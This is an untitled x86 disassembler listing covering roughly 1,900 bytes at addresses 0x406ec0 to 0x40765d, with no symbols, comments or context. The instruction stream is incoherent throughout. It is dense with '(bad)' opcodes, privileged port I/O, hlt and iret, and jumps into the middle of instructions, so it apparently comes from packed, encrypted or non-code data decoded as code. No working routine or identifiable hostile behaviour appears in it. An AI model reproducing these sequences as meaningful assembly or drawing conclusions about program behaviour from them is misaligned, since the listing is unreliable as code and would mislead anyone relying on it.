  406ec0:	mov    edx,0xc39d8c64
  406ec5:	pop    ds
  406ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ec7:	cmp    al,0xc0
  406ec9:	mov    ch,0xaa
  406ecb:	mov    esp,0xb7fe7850
  406ed0:	je     0x406ee9
  406ed2:	and    eax,edx
  406ed4:	hlt    
  406ed5:	in     eax,dx
  406ed6:	dec    esp
  406ed7:	adc    dl,dl
  406ed9:	sub    dl,BYTE PTR [ecx+0xa706c6a]
  406edf:	sahf   
  406ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ee1:	and    bh,BYTE PTR [eax+ebx*2]
  406ee4:	sbb    ecx,edi
  406ee6:	push   ss
  406ee7:	xor    DWORD PTR [eax-0x7e],edi
  406eea:	pusha  
  406eeb:	mov    dl,0x9e
  406eed:	cmp    al,BYTE PTR [edx-0x3060a145]
  406ef3:	cli    
  406ef4:	sub    DWORD PTR [ebx-0x2e],eax
  406ef7:	stos   BYTE PTR es:[edi],al
  406ef8:	push   ecx
  406ef9:	test   DWORD PTR [ebx],0x8d2abab8
  406eff:	lods   al,BYTE PTR ds:[esi]
  406f00:	dec    ecx
  406f01:	xor    DWORD PTR [edx+0x50],edx
  406f04:	test   DWORD PTR [esi+0x7a661159],esp
  406f0a:	addr16 sahf 
  406f0c:	or     bl,0x6d
  406f0f:	iret   
  406f10:	scas   eax,DWORD PTR es:[edi]
  406f11:	or     BYTE PTR [ebx-0x269213b7],al
  406f17:	pop    ecx
  406f18:	push   0x213258a1
  406f1d:	mov    ebp,0x406d31e
  406f22:	test   dh,dh
  406f24:	stc    
  406f25:	mov    eax,0x38824f4a
  406f2a:	push   edi
  406f2b:	sti    
  406f2c:	daa    
  406f2d:	iret   
  406f2e:	int3   
  406f2f:	in     al,0xf9
  406f31:	fs jae 0x406faa
  406f34:	retf   0x5399
  406f37:	jae    0x406f83
  406f39:	sbb    esi,DWORD PTR [eax]
  406f3b:	add    ecx,eax
  406f3d:	add    al,0xa
  406f3f:	iret   
  406f40:	out    0x1a,eax
  406f42:	xor    BYTE PTR [esi-0x30bb0f5d],bl
  406f48:	and    DWORD PTR [esi],edx
  406f4a:	inc    eax
  406f4b:	adc    al,0x29
  406f4d:	pop    ebp
  406f4e:	cmc    
  406f4f:	fst    QWORD PTR [edx-0x24]
  406f52:	(bad)  
  406f53:	dec    esp
  406f54:	outs   dx,DWORD PTR ds:[esi]
  406f55:	pop    esi
  406f56:	jnp    0x406fd2
  406f58:	mov    ds:0x205b254b,al
  406f5d:	(bad)  
  406f5e:	jg     0x406f87
  406f60:	outs   dx,BYTE PTR ds:[esi]
  406f61:	out    dx,al
  406f62:	in     al,0xad
  406f64:	mov    WORD PTR [edx],?
  406f66:	fist   WORD PTR ds:0xe6d6740
  406f6c:	jl     0x406ef6
  406f6e:	gs push es
  406f70:	xchg   esp,eax
  406f71:	jecxz  0x406f9f
  406f73:	jg     0x406f0b
  406f75:	in     eax,dx
  406f76:	icebp  
  406f77:	push   ebp
  406f78:	fisubr DWORD PTR [ecx]
  406f7a:	cmp    esi,DWORD PTR [ecx]
  406f7c:	or     BYTE PTR [ebp-0x50],bl
  406f7f:	cmp    eax,0xd6432321
  406f84:	lods   al,BYTE PTR ds:[esi]
  406f85:	test   dl,0xc7
  406f88:	dec    esi
  406f89:	cwde   
  406f8a:	ror    DWORD PTR [eax-0x33],cl
  406f8d:	add    ebp,edx
  406f8f:	adc    eax,0xf37d4762
  406f94:	and    eax,DWORD PTR [edi]
  406f96:	cmp    eax,DWORD PTR ds:0x2e91927
  406f9c:	aas    
  406f9d:	sbb    edx,ebp
  406f9f:	cmp    DWORD PTR [edi+0x1f],eax
  406fa2:	lahf   
  406fa3:	repnz adc eax,0xce31738d
  406fa9:	loopne 0x406f48
  406fab:	sub    ecx,ebx
  406fad:	jo     0x407020
  406faf:	and    ebx,ebp
  406fb1:	or     ch,BYTE PTR [edi-0x10]
  406fb4:	fdiv   QWORD PTR [esi]
  406fb6:	ror    dh,0xf4
  406fb9:	jb     0x406fa5
  406fbb:	les    edx,FWORD PTR [esi+0x2f7c7446]
  406fc1:	or     BYTE PTR [ecx],bh
  406fc3:	or     ecx,DWORD PTR [ebp+0x78]
  406fc6:	mov    bh,ch
  406fc8:	out    dx,eax
  406fc9:	lods   eax,DWORD PTR ds:[esi]
  406fca:	sbb    al,0x4d
  406fcc:	cmp    esi,esp
  406fce:	das    
  406fcf:	js     0x406fa8
  406fd1:	push   cs
  406fd2:	lods   eax,DWORD PTR ds:[esi]
  406fd3:	imul   ecx,DWORD PTR [eax+0x48],0x4f9e0565
  406fda:	dec    esp
  406fdb:	ja     0x406f64
  406fdd:	dec    eax
  406fde:	jg     0x406fa6
  406fe0:	mov    WORD PTR [eax+0x1182cf91],fs
  406fe6:	les    ebp,FWORD PTR [ebx-0x178f12b]
  406fec:	jmp    0x54cb:0xddad0559
  406ff3:	clc    
  406ff4:	retf   
  406ff5:	(bad)
  406ff8:	in     al,0xb1
  406ffa:	inc    esp
  406ffb:	xor    DWORD PTR [ebp-0x3a],eax
  406ffe:	pop    ebp
  406fff:	or     esi,DWORD PTR ds:0x6c0f50ed
  407005:	into   
  407006:	pop    edx
  407007:	in     eax,dx
  407008:	outs   dx,BYTE PTR ds:[esi]
  407009:	aad    0x92
  40700b:	mov    ebx,0x687b06ae
  407010:	(bad)  
  407012:	rol    BYTE PTR [edi+esi*2-0x3c2a2d03],cl
  407019:	(bad)  
  40701a:	mov    ds:0xaf1eed51,al
  40701f:	mov    ch,0x87
  407021:	mov    edx,0xfd225c02
  407026:	test   BYTE PTR [edi-0x6fbe9095],dl
  40702c:	mov    esi,0xfbdfc08
  407031:	sbb    eax,0x97b2645d
  407036:	jle    0x40706b
  407038:	adc    esi,DWORD PTR [eax+0x5d384a3e]
  40703e:	push   0xffffffea
  407040:	shl    BYTE PTR [ebx-0x79],0x91
  407044:	and    eax,DWORD PTR [edi]
  407046:	mov    edx,0x73e2666e
  40704b:	fcomp  DWORD PTR [edx]
  40704d:	and    BYTE PTR [edi-0x69],ch
  407050:	jecxz  0x407058
  407052:	pop    ebx
  407053:	push   ds
  407054:	mov    ecx,0xbd054c25
  407059:	in     al,dx
  40705a:	(bad)  
  40705b:	stos   BYTE PTR es:[edi],al
  40705c:	aaa    
  40705d:	jae    0x40708e
  40705f:	add    esp,edx
  407061:	data16 jae 0x40709a
  407064:	pop    esp
  407065:	sahf   
  407066:	or     al,0x6b
  407068:	les    esp,FWORD PTR [edi]
  40706a:	xor    eax,0x8ec66cd2
  40706f:	hlt    
  407070:	adc    eax,0xcd7243ee
  407075:	jnp    0x4070c5
  407077:	push   edx
  407078:	call   0xe6e46a1f
  40707d:	leave  
  40707e:	mov    dh,0x64
  407080:	push   eax
  407081:	adc    edx,ebp
  407083:	and    bh,BYTE PTR [esi+0x3c]
  407086:	xlat   BYTE PTR ds:[ebx]
  407087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407088:	xor    al,0x9d
  40708a:	(bad)  
  40708c:	je     0x4070fa
  40708e:	push   cs
  40708f:	push   edi
  407090:	in     eax,0x95
  407092:	stc    
  407093:	or     BYTE PTR [esi-0x56a75a7f],dh
  407099:	retf   
  40709a:	push   es
  40709b:	cmp    al,0x7
  40709d:	adc    DWORD PTR [edi+0x38c329e9],0x8784df94
  4070a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070a8:	sub    BYTE PTR [ebp+0x3f],cl
  4070ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070ac:	and    al,0xe7
  4070ae:	inc    ebp
  4070af:	stc    
  4070b0:	pop    ebx
  4070b1:	lods   al,BYTE PTR ds:[esi]
  4070b2:	in     al,dx
  4070b3:	pop    ebp
  4070b4:	sbb    al,0x31
  4070b6:	mov    ecx,edx
  4070b8:	mov    DWORD PTR [edx-0x28743a44],esp
  4070be:	inc    esp
  4070bf:	cwde   
  4070c0:	xchg   edi,eax
  4070c1:	and    eax,0x31ff6a23
  4070c6:	iret   
  4070c7:	push   cs
  4070c8:	mov    ds,WORD PTR [ebx+0x3ad195d6]
  4070ce:	rcr    DWORD PTR [edi+eax*2+0x6a626a60],1
  4070d5:	pop    eax
  4070d6:	pop    ebx
  4070d7:	ror    DWORD PTR gs:[edi+eiz*4],0x54
  4070dc:	sbb    BYTE PTR [ebx+0x40e0bc94],0xba
  4070e3:	push   esp
  4070e4:	mov    esp,DWORD PTR [ecx+0x67]
  4070e7:	aaa    
  4070e8:	or     BYTE PTR [esi-0x3def59b3],0xdb
  4070ef:	push   eax
  4070f0:	jae    0x407170
  4070f2:	js     0x407135
  4070f4:	inc    edi
  4070f5:	ins    DWORD PTR es:[edi],dx
  4070f6:	mov    ebp,0xb5b2e161
  4070fb:	xchg   ebp,eax
  4070fc:	add    esi,DWORD PTR [ebx+0x17]
  4070ff:	fwait
  407100:	cmp    BYTE PTR [eax],al
  407102:	adc    DWORD PTR [ebp+ebx*2+0x6c48f038],edx
  407109:	or     edi,edx
  40710b:	dec    ecx
  40710c:	cmp    BYTE PTR [edx],bh
  40710e:	clc    
  40710f:	adc    eax,0x8ec5669a
  407114:	leave  
  407115:	pusha  
  407116:	int    0xe0
  407118:	enter  0xb323,0x34
  40711c:	retf   
  40711d:	fdiv   st,st(7)
  40711f:	retf   
  407120:	dec    esp
  407121:	dec    edi
  407122:	push   ss
  407123:	xchg   edx,eax
  407124:	shr    DWORD PTR [edi-0x6c8add24],cl
  40712a:	out    0x72,al
  40712c:	aas    
  40712d:	popf   
  40712e:	rcr    BYTE PTR [eax],1
  407130:	fist   WORD PTR [ebp+0x7402223a]
  407136:	cld    
  407137:	add    al,0x9
  407139:	int    0xed
  40713b:	rcr    DWORD PTR [eax+ebx*4+0xe7df823],1
  407142:	test   DWORD PTR [ebp-0xd32dd25],esp
  407148:	push   ebp
  407149:	enter  0xce7c,0x82
  40714d:	jg     0x40718a
  40714f:	sbb    al,0xfd
  407151:	adc    BYTE PTR [ecx+0x28b78344],0x8a
  407158:	and    DWORD PTR [ecx-0x40],esi
  40715b:	ret    
  40715c:	mov    eax,ecx
  40715e:	inc    ebx
  40715f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407160:	fneni(8087 only) 
  407162:	pusha  
  407163:	inc    ebp
  407164:	jmp    0x40712f
  407166:	in     al,dx
  407167:	in     eax,0x1a
  407169:	or     dl,BYTE PTR [ebx+0x4f]
  40716c:	dec    ebx
  40716d:	push   eax
  40716e:	pop    ebp
  40716f:	ds ins DWORD PTR es:[edi],dx
  407171:	sbb    eax,0xadef8108
  407176:	inc    ecx
  407177:	fnstenv [ebx]
  407179:	jmp    0x4070ff
  40717b:	pop    ebp
  40717c:	cmc    
  40717d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40717e:	pop    eax
  40717f:	inc    ecx
  407180:	mov    dl,0x29
  407182:	popf   
  407183:	ret    0xe95d
  407186:	ja     0x4071a1
  407188:	adc    bh,cl
  40718a:	lock xor ebp,DWORD PTR [esi]
  40718d:	arpl   WORD PTR [eax+0x67810a0d],bp
  407193:	sub    edi,DWORD PTR [esi-0x3d]
  407196:	inc    eax
  407197:	ja     0x40716b
  407199:	lds    eax,FWORD PTR [edx+edx*8-0x27]
  40719d:	repz xchg ecx,eax
  40719f:	and    DWORD PTR [ebx],ecx
  4071a1:	cmp    eax,0xb6536b4e
  4071a6:	(bad)  
  4071a7:	cld    
  4071a8:	add    esi,DWORD PTR [esi-0x58818243]
  4071ae:	or     eax,0x30fa474f
  4071b3:	pop    edi
  4071b4:	push   eax
  4071b5:	shl    DWORD PTR [ecx],cl
  4071b7:	pop    ebp
  4071b8:	jo     0x407152
  4071ba:	jmp    0xd3c2eb13
  4071bf:	jl     0x407187
  4071c1:	xor    DWORD PTR [ebx],ebx
  4071c3:	jb     0x4071bf
  4071c5:	sub    DWORD PTR [ebx+0x20],ebx
  4071c8:	fbld   TBYTE PTR [eax+0x3d]
  4071cb:	ror    DWORD PTR [edx+0x521e38b3],0x37
  4071d2:	fwait
  4071d3:	adc    eax,0x24a07619
  4071d8:	push   ss
  4071d9:	ret    0x435
  4071dc:	cmp    BYTE PTR [eax+ebx*8+0x19ced80e],bl
  4071e3:	outs   dx,BYTE PTR ds:[esi]
  4071e4:	mov    BYTE PTR [ebx+eax*2+0x68b337d3],0x63
  4071ec:	out    dx,al
  4071ed:	sar    bh,0xe4
  4071f0:	and    edi,DWORD PTR [eax+0x1675e041]
  4071f6:	sub    al,0x8a
  4071f8:	cmp    BYTE PTR [esi+0x27],0xb
  4071fc:	hlt    
  4071fd:	retf   0x7325
  407200:	arpl   dx,cx
  407202:	sub    BYTE PTR [esi],ch
  407204:	(bad)
  407207:	xchg   esi,eax
  407208:	xchg   ebp,eax
  407209:	mov    edx,0x8a5273ce
  40720e:	js     0x40722f
  407210:	xor    BYTE PTR [ebp+0x248e217],0xe7
  407217:	test   eax,ecx
  407219:	out    dx,al
  40721a:	test   eax,0xdfef83f9
  40721f:	shl    dh,cl
  407221:	sub    al,BYTE PTR [ebx-0x74a51419]
  407227:	lahf   
  407228:	clc    
  407229:	or     eax,0xb2f0e63c
  40722e:	add    al,0xa9
  407230:	pop    ecx
  407231:	adc    ebp,DWORD PTR [ebp+0x27]
  407234:	ret    0x474e
  407237:	inc    esp
  407238:	mov    edx,0xf603902c
  40723d:	hlt    
  40723e:	add    DWORD PTR [edi],esp
  407240:	aam    0xa7
  407242:	pushf  
  407243:	pusha  
  407244:	cmp    DWORD PTR [edi+eax*1+0x26f03c],edi
  40724b:	mov    ebp,0x3aa8ccdc
  407250:	pop    ss
  407251:	jmp    0x407296
  407253:	and    al,0x91
  407255:	inc    eax
  407256:	lahf   
  407257:	and    BYTE PTR [esi-0x2f],0x2f
  40725b:	ret    0xe703
  40725e:	(bad)  
  407260:	xchg   BYTE PTR [edi+0x19],bl
  407263:	shl    DWORD PTR cs:[ebp+0x6e],0xce
  407268:	loope  0x4071f9
  40726a:	(bad)  
  40726b:	sar    DWORD PTR [ecx],1
  40726d:	push   edi
  40726e:	sub    cl,BYTE PTR [esp+eax*1]
  407271:	mov    ds:0x39926e0e,eax
  407276:	ja     0x407236
  407278:	fcomip st,st(1)
  40727a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40727b:	loop   0x407257
  40727d:	test   eax,0xd89cc718
  407282:	jg     0x407204
  407284:	xchg   edi,eax
  407285:	or     edi,ebx
  407287:	icebp  
  407288:	xor    ebx,ebp
  40728a:	lock hlt 
  40728c:	xchg   esi,eax
  40728d:	stc    
  40728e:	fld    TBYTE PTR [ecx+edi*8+0x269f4cde]
  407295:	sub    dh,BYTE PTR [ecx]
  407297:	sub    al,0x4d
  407299:	jae    0x4072b8
  40729b:	jge    0x40727a
  40729d:	arpl   cx,bx
  40729f:	mov    bh,0x1a
  4072a1:	js     0x40727f
  4072a3:	mov    cl,0xed
  4072a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072a6:	xchg   ecx,eax
  4072a7:	fsub   DWORD PTR [esi]
  4072a9:	test   BYTE PTR [ebp+0x4d],dh
  4072ac:	call   0xf507:0x2f8a2886
  4072b3:	pop    es
  4072b4:	in     al,dx
  4072b5:	popf   
  4072b6:	mov    ds,WORD PTR [esi]
  4072b8:	repnz inc ebx
  4072ba:	std    
  4072bb:	pop    esp
  4072bc:	stos   DWORD PTR es:[edi],eax
  4072bd:	fptan  
  4072bf:	outs   dx,DWORD PTR ds:[esi]
  4072c0:	mov    eax,ds:0xa6f77995
  4072c5:	xchg   edx,eax
  4072c6:	int3   
  4072c7:	shr    ah,1
  4072c9:	in     eax,dx
  4072ca:	(bad)
  4072cd:	lods   al,BYTE PTR ds:[esi]
  4072ce:	mov    dl,0x4c
  4072d0:	and    al,0x3f
  4072d2:	int3   
  4072d3:	push   es
  4072d4:	mov    ebx,esi
  4072d6:	test   DWORD PTR [ebx],ebx
  4072d8:	xor    ecx,DWORD PTR [ebx-0x36c07e4d]
  4072de:	inc    esi
  4072df:	inc    eax
  4072e0:	or     BYTE PTR [eax],0x28
  4072e3:	adc    ch,al
  4072e5:	dec    edx
  4072e6:	xor    eax,0xe5e5d8ef
  4072eb:	cmc    
  4072ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072ed:	scas   al,BYTE PTR es:[edi]
  4072ee:	sub    al,0x57
  4072f0:	scas   al,BYTE PTR es:[edi]
  4072f1:	loope  0x4072d4
  4072f3:	jnp    0x40727f
  4072f5:	inc    eax
  4072f6:	push   eax
  4072f7:	jg     0x4072ee
  4072f9:	xchg   esp,eax
  4072fa:	xrelease mov DWORD PTR [ebx+edx*4],eax
  4072fe:	jp     0x4072e7
  407300:	pop    edx
  407301:	pop    es
  407302:	sub    DWORD PTR [ebx],ecx
  407304:	lock pusha 
  407306:	adc    DWORD PTR [eax+ecx*1-0x738a1aa],0x7a523293
  407311:	lods   al,BYTE PTR ds:[esi]
  407312:	fild   DWORD PTR [ecx-0x1b]
  407315:	and    eax,0x5082a6ff
  40731a:	pop    ss
  40731b:	sahf   
  40731c:	ja     0x4072b0
  40731e:	xor    BYTE PTR [ebp-0x16d14f1],cl
  407324:	fs hlt 
  407326:	repz js 0x4073a3
  407329:	icebp  
  40732a:	mov    ch,0xa3
  40732c:	inc    esi
  40732d:	dec    eax
  40732e:	aad    0x51
  407330:	iret   
  407331:	xchg   edi,ecx
  407333:	stos   DWORD PTR es:[edi],eax
  407334:	and    DWORD PTR [eax],edx
  407336:	adc    DWORD PTR [edx+0x6c0ad5e3],edx
  40733c:	out    0x2a,al
  40733e:	mov    edi,0x83840f40
  407343:	inc    esp
  407344:	int3   
  407345:	rcr    DWORD PTR [ecx],1
  407347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407348:	sbb    ebx,ebx
  40734a:	nop
  40734b:	xchg   edx,eax
  40734c:	ja     0x407375
  40734e:	clc    
  40734f:	sbb    eax,0x86c94334
  407354:	jl     0x407371
  407356:	adc    al,0x7c
  407358:	and    BYTE PTR [eax-0x40321097],bh
  40735e:	mov    bl,0x7e
  407360:	std    
  407361:	and    ebp,eax
  407363:	mov    edi,0x94dc0314
  407368:	psubusb mm1,mm4
  40736b:	push   ebx
  40736c:	aaa    
  40736d:	imul   edx,ebp,0x3a
  407370:	aad    0x1e
  407372:	push   ebp
  407373:	pop    ebp
  407374:	loopne 0x4073c7
  407376:	xlat   BYTE PTR ds:[ebx]
  407377:	cld    
  407378:	inc    ebp
  407379:	fwait
  40737a:	xor    DWORD PTR [ecx+ebp*1+0x52f90ebe],eax
  407381:	jno    0x4073bc
  407383:	cmc    
  407384:	loop   0x4073ae
  407386:	fucomp st(4)
  407388:	jne    0x407323
  40738a:	sar    DWORD PTR es:[esi+0x115e0a66],1
  407391:	adc    eax,0x8973262a
  407396:	js     0x4073dd
  407398:	adc    bh,dl
  40739a:	sub    BYTE PTR [esi+0x732e0f14],bl
  4073a0:	mov    dh,0xde
  4073a2:	std    
  4073a3:	xchg   ah,dh
  4073a5:	fild   DWORD PTR [ebp+0x7]
  4073a8:	sub    al,0xba
  4073aa:	daa    
  4073ab:	pushfw 
  4073ad:	lahf   
  4073ae:	xor    ebp,edi
  4073b0:	ret    
  4073b1:	shl    dl,cl
  4073b3:	dec    edi
  4073b4:	adc    DWORD PTR [ebx],ebx
  4073b6:	xchg   DWORD PTR [esp+esi*1-0x4f5f7ac5],esi
  4073bd:	pop    ss
  4073be:	inc    esp
  4073bf:	push   edx
  4073c0:	dec    esp
  4073c1:	leave  
  4073c2:	jns    0x4073bf
  4073c4:	aaa    
  4073c5:	xchg   dh,ch
  4073c7:	lahf   
  4073c8:	into   
  4073c9:	loopne 0x407442
  4073cb:	loope  0x407412
  4073cd:	mov    ds:0x2d297504,al
  4073d2:	xchg   ebx,eax
  4073d3:	neg    DWORD PTR [ebp+edi*8+0x7e]
  4073d7:	jno    0x407379
  4073d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073da:	je     0x407404
  4073dc:	popa   
  4073dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073de:	add    BYTE PTR [esi-0x65],0x6d
  4073e2:	adc    DWORD PTR [edi+ebx*4],esp
  4073e5:	cmp    bh,BYTE PTR [eax+0x21b334ee]
  4073eb:	test   al,0x9a
  4073ed:	in     al,dx
  4073ee:	loopne 0x4073e2
  4073f0:	inc    ebp
  4073f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073f2:	lea    edi,[ebp+0x3f7360f6]
  4073f8:	dec    esp
  4073f9:	hlt    
  4073fa:	hlt    
  4073fb:	cmp    BYTE PTR [ebx-0x5e],bl
  4073fe:	ret    0x29a
  407401:	sar    DWORD PTR fs:0x8802b2d0,cl
  407408:	stc    
  407409:	ret    0x19da
  40740c:	inc    ebp
  40740d:	popf   
  40740e:	pand   mm0,QWORD PTR [edi+0x7c7ef8c6]
  407415:	(bad)  
  407416:	sar    DWORD PTR ds:0xe955e7ac,cl
  40741c:	pop    edx
  40741d:	add    eax,0x8c664f43
  407422:	std    
  407423:	dec    edx
  407424:	dec    esi
  407425:	test   eax,0x288a9000
  40742a:	cmp    DWORD PTR [ebx-0x6df8ba49],ebx
  407430:	sub    BYTE PTR [edi-0x6e],al
  407433:	int    0xd7
  407435:	shl    DWORD PTR [esi+0xdebb16d],1
  40743b:	inc    esp
  40743c:	mov    dh,0xc0
  40743e:	xchg   ebp,eax
  40743f:	pop    eax
  407440:	cmp    DWORD PTR cs:[ebx-0x7409e999],ebp
  407447:	je     0x4073c9
  407449:	(bad)  
  40744b:	data16 fimul WORD PTR [ebp-0x5f]
  40744f:	cmc    
  407450:	or     DWORD PTR [eax-0xbe7fef8],edx
  407456:	sahf   
  407457:	xor    dh,BYTE PTR ds:0x4484
  40745c:	or     ebp,DWORD PTR [edi-0x56f14bce]
  407462:	(bad)  
  407463:	and    eax,0x6f852d0e
  407468:	jbe    0x407499
  40746a:	(bad)  
  40746b:	xchg   ecx,eax
  40746c:	iret   
  40746d:	mov    ah,0x3e
  40746f:	dec    edi
  407470:	mov    ah,0xa
  407472:	fcomp  QWORD PTR [eax+ebp*4+0x75]
  407476:	mov    dh,0x2b
  407478:	sbb    esp,DWORD PTR [ebp-0x35]
  40747b:	mov    ch,0x29
  40747d:	cli    
  40747e:	jmp    0x4074e9
  407480:	cmp    al,0x85
  407482:	push   cs
  407483:	cmp    al,0xc8
  407485:	fisub  WORD PTR [eax-0xa]
  407488:	(bad)  
  407489:	mov    edx,0x965a6e06
  40748e:	mov    ds:0xef94bdd2,eax
  407493:	shl    BYTE PTR [ecx],1
  407495:	dec    ecx
  407496:	jae    0x4074d2
  407498:	and    edi,DWORD PTR [edx+0x48cae8de]
  40749e:	jge    0x407479
  4074a0:	fwait
  4074a1:	xchg   DWORD PTR [ebx],ebx
  4074a3:	call   0xfd413342
  4074a8:	stos   BYTE PTR es:[edi],al
  4074a9:	mov    ecx,0x5099f783
  4074ae:	dec    ebp
  4074af:	jne    0x407499
  4074b1:	ins    BYTE PTR es:[edi],dx
  4074b2:	cli    
  4074b3:	ficom  WORD PTR [ebx-0x65]
  4074b6:	sahf   
  4074b7:	xor    eax,0xfbd6a9e4
  4074bc:	stos   BYTE PTR es:[edi],al
  4074bd:	retf   
  4074be:	(bad)  
  4074bf:	dec    esp
  4074c0:	xchg   ebp,eax
  4074c1:	dec    eax
  4074c2:	push   ecx
  4074c3:	xchg   edx,eax
  4074c4:	sub    DWORD PTR [ebx-0x455f1b69],0x7c1ab7e1
  4074ce:	inc    ebp
  4074cf:	add    eax,0xa9d13142
  4074d4:	fild   DWORD PTR [ebp+0x5a]
  4074d7:	in     al,0x84
  4074d9:	inc    esp
  4074da:	cdq    
  4074db:	xchg   edi,eax
  4074dc:	int3   
  4074dd:	dec    ebp
  4074df:	js     0x4074ae
  4074e1:	dec    esp
  4074e2:	test   BYTE PTR [ebx],bh
  4074e4:	js     0x40755a
  4074e6:	fisub  WORD PTR [edi]
  4074e8:	jae    0x4074cd
  4074ea:	shr    BYTE PTR [ebx+ecx*8-0x5cbf52c9],1
  4074f1:	shl    DWORD PTR [ecx],0x6a
  4074f4:	shl    DWORD PTR [ecx+0x26],0x82
  4074f8:	or     eax,0xc5bff1ff
  4074fd:	xchg   edi,eax
  4074fe:	leave  
  4074ff:	inc    esp
  407500:	aad    0x98
  407502:	jmp    0xfeec:0xe5d3ffbc
  407509:	cld    
  40750a:	addr16 int 0xb6
  40750d:	int3   
  40750e:	push   esp
  40750f:	xor    al,BYTE PTR [esi+0x69]
  407512:	in     al,0xe
  407514:	mov    al,ds:0x5570c8b3
  407519:	(bad)  
  40751a:	repz ret 0x5aa3
  40751e:	cmp    edx,eax
  407520:	mov    BYTE PTR [esi-0x67c074e8],bh
  407526:	inc    ecx
  407528:	mov    es:0x87303312,eax
  40752e:	mov    al,BYTE PTR [edi]
  407530:	call   DWORD PTR [edi+0x21]
  407533:	adc    bl,dl
  407535:	or     DWORD PTR [esi],eax
  407537:	int3   
  407538:	ins    DWORD PTR es:[edi],dx
  407539:	or     eax,0x5ad3fd2a
  40753e:	icebp  
  40753f:	stos   DWORD PTR es:[edi],eax
  407540:	mov    eax,esp
  407542:	xor    BYTE PTR [eax],ah
  407544:	(bad)  
  407545:	jmp    0x4075c1
  407547:	in     al,0xfb
  407549:	cmp    eax,0x1b02e952
  40754e:	sbb    edi,edx
  407550:	mov    ebp,0xb4d914ae
  407555:	arpl   WORD PTR [ebx],si
  407557:	je     0x407546
  407559:	push   ecx
  40755a:	pop    ebx
  40755b:	xchg   ebx,esi
  40755d:	in     eax,0xe7
  40755f:	je     0x40754f
  407561:	(bad)  
  407563:	inc    ebp
  407564:	loopne 0x407594
  407566:	push   esp
  407567:	pushf  
  407568:	loop   0x407505
  40756a:	lock mov bh,0xae
  40756d:	nop
  40756e:	mov    ds,edx
  407570:	cmp    bh,cl
  407572:	sti    
  407573:	mov    al,0x90
  407575:	pop    ds
  407576:	(bad)  
  407577:	in     al,0xfc
  407579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40757a:	inc    edx
  40757b:	pop    eax
  40757c:	inc    edi
  40757d:	ror    DWORD PTR [ebx+0x65],0x8f
  407581:	out    0x2c,al
  407583:	dec    ebp
  407584:	and    esp,DWORD PTR [edx+eiz*1-0x34b36320]
  40758b:	mov    ds:0x6ed08d51,eax
  407590:	mov    ch,0x31
  407592:	push   esi
  407593:	ss add eax,0x9ab8b0b
  407599:	cmp    ch,bh
  40759b:	test   dl,ch
  40759d:	popf   
  40759e:	pop    ss
  40759f:	or     ah,cl
  4075a1:	mov    bh,0x93
  4075a3:	and    DWORD PTR [ebp+edx*2-0x7d],ebp
  4075a7:	leave  
  4075a8:	jp     0x4075d6
  4075aa:	sbb    bl,BYTE PTR [eax+0x1effa79d]
  4075b0:	mov    eax,0xa3a30151
  4075b5:	dec    edx
  4075b6:	push   esp
  4075b7:	push   eax
  4075b8:	push   ss
  4075b9:	ficomp WORD PTR [edx+0x66]
  4075bc:	xlat   BYTE PTR ds:[ebx]
  4075bd:	ja     0x407551
  4075bf:	mov    eax,ds:0x4c6af3ea
  4075c4:	xchg   DWORD PTR [eax-0x3ac57658],esp
  4075ca:	adc    ah,BYTE PTR ds:0x5a62e04f
  4075d0:	cmp    ecx,ecx
  4075d2:	jg     0x407641
  4075d4:	out    0x8e,al
  4075d6:	arpl   WORD PTR [ebx-0x2e],cx
  4075d9:	fdivr  DWORD PTR [edi+0x6f21d380]
  4075df:	js     0x4075d5
  4075e1:	outs   dx,BYTE PTR ds:[esi]
  4075e2:	(bad)  
  4075e3:	fmul   QWORD PTR [edi]
  4075e5:	fsub   DWORD PTR [edi]
  4075e7:	(bad)  
  4075e8:	fwait
  4075e9:	mov    BYTE PTR [edx+0x1d7e1aa6],dl
  4075ef:	add    ebp,esp
  4075f1:	push   ds
  4075f2:	lods   al,BYTE PTR ds:[esi]
  4075f3:	push   ebx
  4075f4:	push   0x0
  4075f6:	sti    
  4075f7:	pop    edi
  4075f8:	jbe    0x4075bc
  4075fa:	xchg   esi,eax
  4075fb:	sbb    ch,BYTE PTR [esi]
  4075fd:	mov    edx,DWORD PTR [edx]
  4075ff:	push   es
  407600:	hlt    
  407601:	mov    esi,DWORD PTR [ecx+0x7a]
  407604:	dec    edi
  407605:	fdivr  DWORD PTR [ebp+0x64ada23c]
  40760b:	imul   ecx,DWORD PTR [ebp+0x44],0x62c683f3
  407612:	inc    edi
  407613:	xchg   ebx,eax
  407614:	cmp    ecx,DWORD PTR ds:0x214a81b6
  40761a:	or     eax,0x881e2986
  40761f:	fidiv  DWORD PTR [ebp+ebx*8-0x388828f7]
  407626:	stos   BYTE PTR es:[edi],al
  407627:	xchg   BYTE PTR [esi-0x786ea73e],al
  40762d:	xchg   esi,eax
  40762e:	pop    ds
  40762f:	adc    DWORD PTR [esi],edi
  407631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407632:	mov    ds:0x4223a56,al
  407637:	xlat   BYTE PTR ds:[ebx]
  407638:	popf   
  407639:	icebp  
  40763a:	mov    al,ds:0x14381480
  40763f:	call   0x2f73c3f2
  407644:	jl     0x4075e4
  407646:	lea    esi,[edi+ecx*4]
  407649:	or     ah,BYTE PTR [ecx+0x44d3c90a]
  40764f:	popf   
  407650:	ficomp DWORD PTR [edi+0xa]
  407653:	add    al,ah
  407655:	mov    al,0xa2
  407657:	jbe    0x4075e5
  407659:	arpl   WORD PTR [ecx],bx
  40765b:	jg     0x4075eb
  40765d:	cmp    eax,0xd09a71cb
